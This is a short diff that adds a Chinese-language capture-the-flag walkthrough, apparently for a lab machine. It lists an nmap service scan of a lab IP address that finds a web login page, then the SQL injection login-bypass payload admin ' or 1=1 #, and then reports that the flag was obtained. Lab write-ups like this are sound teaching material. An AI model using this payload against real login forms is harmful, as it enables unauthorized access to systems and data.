@@ -1,0 +1,3 @@
+1. nmap -sV -sC  10.129.34.168 > nmap.txt ： 探测出web登录页面
+2. sql注入尝试： admin ' or 1=1 #
+3. 成功获取flag
